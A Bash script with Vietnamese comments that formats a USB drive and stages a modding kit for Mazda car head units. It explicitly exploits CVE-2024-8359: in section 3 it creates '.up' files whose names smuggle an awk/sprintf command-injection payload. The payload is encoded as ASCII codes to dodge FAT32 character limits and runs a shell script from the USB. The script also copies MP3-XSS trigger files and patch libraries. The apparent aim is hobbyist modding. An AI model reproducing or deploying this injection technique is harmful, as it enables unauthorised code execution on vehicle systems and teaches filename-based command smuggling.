#!/bin/bash
# ============================================================================
#  make_usb.sh - Script tạo USB cài đặt oem-aa-mod cho Mazda CMU
#  Tham khảo cơ chế từ ilshyma/mazda-hud-toolkit (CVE-2024-8359 + MP3-XSS)
# ============================================================================

set -e

# Đảm bảo chạy đúng bằng Bash
if [ -z "${BASH_VERSION:-}" ]; then
  exec /bin/bash "$0" "$@"
fi

SCRIPT_DIR=$(cd "$(dirname "$0")" && pwd)
REPO_ROOT=$(cd "$SCRIPT_DIR/../.." && pwd)

# Màu hiển thị
if [ -t 1 ]; then
  C_R='\033[31m'; C_G='\033[32m'; C_Y='\033[33m'; C_B='\033[34m'; C_C='\033[36m'
  C_BOLD='\033[1m'; C_DIM='\033[2m'; C_0='\033[0m'
else
  C_R=''; C_G=''; C_Y=''; C_B=''; C_C=''; C_BOLD=''; C_DIM=''; C_0=''
fi

ok()   { printf "%b✓%b %s\n"  "$C_G" "$C_0" "$*"; }
err()  { printf "%b✗%b %s\n"  "$C_R" "$C_0" "$*"; }
warn() { printf "%b!%b %s\n"  "$C_Y" "$C_0" "$*"; }
info() { printf "%b▸%b %s\n"  "$C_C" "$C_0" "$*"; }
hdr()  { echo; printf "%b═══ %s ═══%b\n" "$C_C" "$*" "$C_0"; }

hdr "CÔNG CỤ TẠO USB CÀI ĐẶT OEM-AA-MOD (MAZDA CMU)"

OS_TYPE=$(uname -s)
if [ "$OS_TYPE" != "Darwin" ] && [ "$OS_TYPE" != "Linux" ]; then
  err "Hệ điều hành $OS_TYPE chưa được hỗ trợ bởi script này. Vui lòng dùng macOS hoặc Linux."
  exit 1
fi

info "Đang quét các thiết bị USB ngoài..."
echo

# -----------------------------------------------------------------------------
# 1. Quét và chọn ổ USB
# -----------------------------------------------------------------------------
TARGET_DEV=""
TARGET_MOUNT=""

if [ "$OS_TYPE" = "Darwin" ]; then
  TMP_DISKS=$(mktemp -t mzdusb) || { err "Không thể tạo file tạm"; exit 1; }
  diskutil list external 2>/dev/null | grep -E '^/dev/disk[0-9]+ \(external' > "$TMP_DISKS" || true

  set --
  N=0
  while IFS= read -r line; do
    [ -z "$line" ] && continue
    id="${line%% *}"
    dev="${id##*/}"
    sz=$(diskutil info "$id" 2>/dev/null | awk -F': *' '/^ *Disk Size/{print $2; exit}')
    name=$(diskutil info "$id" 2>/dev/null | awk -F': *' '/^ *Device \/ Media Name/{print $2; exit}')
    N=$((N+1))
    set -- "$@" "$dev|${sz:-?} — ${name:-USB drive}"
  done < "$TMP_DISKS"
  rm -f "$TMP_DISKS"

  if [ "$N" -eq 0 ]; then
    err "Không tìm thấy ổ USB ngoài nào được cắm vào máy!"
    warn "Hãy cắm USB (>= 1GB) và chạy lại script."
    exit 1
  fi

  echo "Chọn ổ USB để FORMAT và ghi cài đặt (LƯU Ý: TOÀN BỘ DỮ LIỆU SẼ BỊ XOÁ):"
  echo
  i=1
  for e in "$@"; do
    d="${e%%|*}"
    l="${e#*|}"
    printf "  %b%d%b  /dev/%-7s  %s\n" "$C_BOLD" "$i" "$C_0" "$d" "$l"
    i=$((i+1))
  done
  printf "  %b0%b  Hủy bỏ\n" "$C_BOLD" "$C_0"
  echo
  printf "> "
  read -r CH
  case "$CH" in
    ""|0) warn "Đã hủy thao tác."; exit 0 ;;
    [1-9]|[1-9][0-9]) : ;;
    *) warn "Lựa chọn không hợp lệ"; exit 1 ;;
  esac

  if [ "$CH" -lt 1 ] || [ "$CH" -gt "$N" ]; then
    warn "Số lựa chọn nằm ngoài phạm vi."
    exit 1
  fi

  eval "SEL=\${$CH}"
  TARGET_DEV="/dev/${SEL%%|*}"
  INFO="${SEL#*|}"

  echo
  warn "CẢNH BÁO: Toàn bộ dữ liệu trên $TARGET_DEV ($INFO) sẽ bị XOÁ SẠCH!"
  printf "Bạn có chắc chắn muốn format ổ này thành FAT32 / MZD không? [y/N] > "
  read -r CONFIRM
  case "$CONFIRM" in y|Y) : ;; *) warn "Đã hủy."; exit 0 ;; esac

  echo
  info "[1/4] Đang unmount $TARGET_DEV..."
  diskutil unmountDisk "$TARGET_DEV" || true

  info "[2/4] Đang format $TARGET_DEV thành FAT32 / MZD (MBR)..."
  if ! diskutil eraseDisk "MS-DOS" MZD MBR "$TARGET_DEV"; then
    err "Format bằng diskutil thất bại! Bạn có thể format thủ công qua Disk Utility (MS-DOS FAT, MBR, Label: MZD)."
    exit 1
  fi

  TARGET_MOUNT="/Volumes/MZD"
  w=0
  while [ ! -d "$TARGET_MOUNT" ] && [ $w -lt 20 ]; do
    sleep 1
    w=$((w+1))
  done

  if [ ! -d "$TARGET_MOUNT" ]; then
    err "Ổ đĩa không tự mount tại $TARGET_MOUNT sau 20s. Vui lòng kiểm tra lại!"
    exit 1
  fi
else
  # Linux handling
  lsblk -d -o NAME,SIZE,MODEL,TRAN | grep -i usb || true
  echo
  printf "Nhập tên thiết bị USB (ví dụ: sdb, sdc - KHÔNG nhập sda nếu là ổ hệ thống): "
  read -r DEV_NAME
  if [ -z "$DEV_NAME" ] || [ "$DEV_NAME" = "sda" ]; then
    err "Tên thiết bị không an toàn hoặc trống!"; exit 1
  fi
  TARGET_DEV="/dev/$DEV_NAME"
  warn "CẢNH BÁO: Bạn sắp xoá toàn bộ $TARGET_DEV!"
  printf "Xác nhận [y/N]: "
  read -r CONFIRM
  case "$CONFIRM" in y|Y) : ;; *) warn "Đã hủy."; exit 0 ;; esac

  umount "${TARGET_DEV}"* 2>/dev/null || true
  parted -s "$TARGET_DEV" mklabel msdos mkpart primary fat32 1MiB 100%
  mkfs.vfat -F 32 -n MZD "${TARGET_DEV}1"
  TARGET_MOUNT="/tmp/mzd_mount_$$"
  mkdir -p "$TARGET_MOUNT"
  mount "${TARGET_DEV}1" "$TARGET_MOUNT"
fi

ok "Ổ đĩa đã sẵn sàng tại: $TARGET_MOUNT"

# -----------------------------------------------------------------------------
# 2. Copy payload và các file kích hoạt
# -----------------------------------------------------------------------------
info "[3/4] Đang sao chép các file kích hoạt và mã cài đặt..."

# Bắt buộc tắt AppleDouble sidecars (._*) trên macOS để tránh làm treo trình phát nhạc CMU
export COPYFILE_DISABLE=1

# 2.1 File kích hoạt cơ bản
cp -f "$SCRIPT_DIR/jci-autoupdate"          "$TARGET_MOUNT/" 2>/dev/null || true
cp -f "$SCRIPT_DIR/dataRetrieval_config.txt" "$TARGET_MOUNT/" 2>/dev/null || true
cp -f "$SCRIPT_DIR/t"                        "$TARGET_MOUNT/" 2>/dev/null || true
cp -f "$SCRIPT_DIR/h"                        "$TARGET_MOUNT/" 2>/dev/null || true
cp -f "$SCRIPT_DIR/s"                        "$TARGET_MOUNT/" 2>/dev/null || true
cp -f "$SCRIPT_DIR/tweaks.sh"                 "$TARGET_MOUNT/" 2>/dev/null || true
cp -f "$SCRIPT_DIR/run.sh"                   "$TARGET_MOUNT/" 2>/dev/null || true
cp -f "$SCRIPT_DIR/run-aa.sh"                "$TARGET_MOUNT/" 2>/dev/null || true
cp -f "$SCRIPT_DIR/run-carplay.sh"           "$TARGET_MOUNT/" 2>/dev/null || true
cp -f "$SCRIPT_DIR/mp3title.txt"             "$TARGET_MOUNT/" 2>/dev/null || true
cp -f "$SCRIPT_DIR/dev.html"                 "$TARGET_MOUNT/" 2>/dev/null || true

# 2.2 Thư mục MP3, JS và CSS cho Webview UI / MP3-XSS
mkdir -p "$TARGET_MOUNT/mp3" "$TARGET_MOUNT/js" "$TARGET_MOUNT/css"
cp -rf "$SCRIPT_DIR/mp3/"*.mp3 "$TARGET_MOUNT/mp3/" 2>/dev/null || true
cp -rf "$SCRIPT_DIR/mp3/"*.mp3 "$TARGET_MOUNT/"     2>/dev/null || true  # Bản sao ở root cho CMU autoplay
cp -rf "$SCRIPT_DIR/js/"*      "$TARGET_MOUNT/js/"  2>/dev/null || true
cp -rf "$SCRIPT_DIR/css/"*     "$TARGET_MOUNT/css/" 2>/dev/null || true

# 2.3 Sao chép các file cấu hình resources/
mkdir -p "$TARGET_MOUNT/resources"
if [ -d "$SCRIPT_DIR/resources" ]; then
  cp -rf "$SCRIPT_DIR/resources/"* "$TARGET_MOUNT/resources/" 2>/dev/null || true
elif [ -d "$REPO_ROOT/resources" ]; then
  cp -rf "$REPO_ROOT/resources/"* "$TARGET_MOUNT/resources/" 2>/dev/null || true
fi

# 2.4 Sao chép các file binary .so & daemon tốc độ
# Ưu tiên các file nằm cùng thư mục script (khi giải nén từ release zip), sau đó tìm trong build/
if ls "$SCRIPT_DIR"/libpatch-*.so >/dev/null 2>&1; then
  cp -f "$SCRIPT_DIR"/libpatch-*.so "$TARGET_MOUNT/" 2>/dev/null || true
elif [ -d "$REPO_ROOT" ]; then
  find "$REPO_ROOT" -name "libpatch-*.so" -exec cp -f {} "$TARGET_MOUNT/" \; 2>/dev/null || true
fi

if ls "$SCRIPT_DIR"/splim_* >/dev/null 2>&1; then
  cp -f "$SCRIPT_DIR"/splim_* "$TARGET_MOUNT/" 2>/dev/null || true
elif [ -d "$REPO_ROOT" ]; then
  find "$REPO_ROOT" -name "splim_*" -maxdepth 3 -type f -exec cp -f {} "$TARGET_MOUNT/" \; 2>/dev/null || true
fi

# -----------------------------------------------------------------------------
# 3. Tạo 2 file .up khai thác lỗ hổng CVE-2024-8359
# -----------------------------------------------------------------------------
info "Đang tạo payload CVE-2024-8359 (.up command injection)..."

# Payload giải mã ASCII qua awk sprintf để vượt giới hạn ký tự cấm của FAT32 (/ \ " * ? < > | :)
# UP_MNT: sh /mnt/sd[abcd]1/t
UP_MNT='$(awk -v f=%c '"'"'BEGIN{s=f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}'"'"').up'
# UP_TMP: sh /tmp/mnt/sd[abcd]1/t
UP_TMP='$(awk -v f=%c '"'"'BEGIN{s=f f f f f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,116,109,112,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}'"'"').up'

: > "$TARGET_MOUNT/${UP_MNT}"
: > "$TARGET_MOUNT/${UP_TMP}"

# Dọn dẹp sạch sẽ các file rác ẩn của macOS nếu có
find "$TARGET_MOUNT" \( -name '._*' -o -name '.DS_Store' -o -name '.Trashes' \
                     -o -name '.Spotlight-V100' -o -name '.fseventsd' \) \
     -exec rm -rf {} + 2>/dev/null || true

sync

# -----------------------------------------------------------------------------
# 4. Kiểm tra hoàn tất
# -----------------------------------------------------------------------------
info "[4/4] Kiểm tra danh sách file trên USB..."
echo
ls -la "$TARGET_MOUNT" | sed 's/^/  /'
echo

if [ "$OS_TYPE" = "Darwin" ]; then
  diskutil unmountDisk "$TARGET_DEV" || true
else
  umount "$TARGET_MOUNT" 2>/dev/null || true
  rmdir "$TARGET_MOUNT" 2>/dev/null || true
fi

ok "======================================================================"
ok "TẠO USB CÀI ĐẶT THÀNH CÔNG!"
ok "Bây giờ bạn có thể rút USB và mang ra xe cắm vào cổng USB 1."
ok "======================================================================"
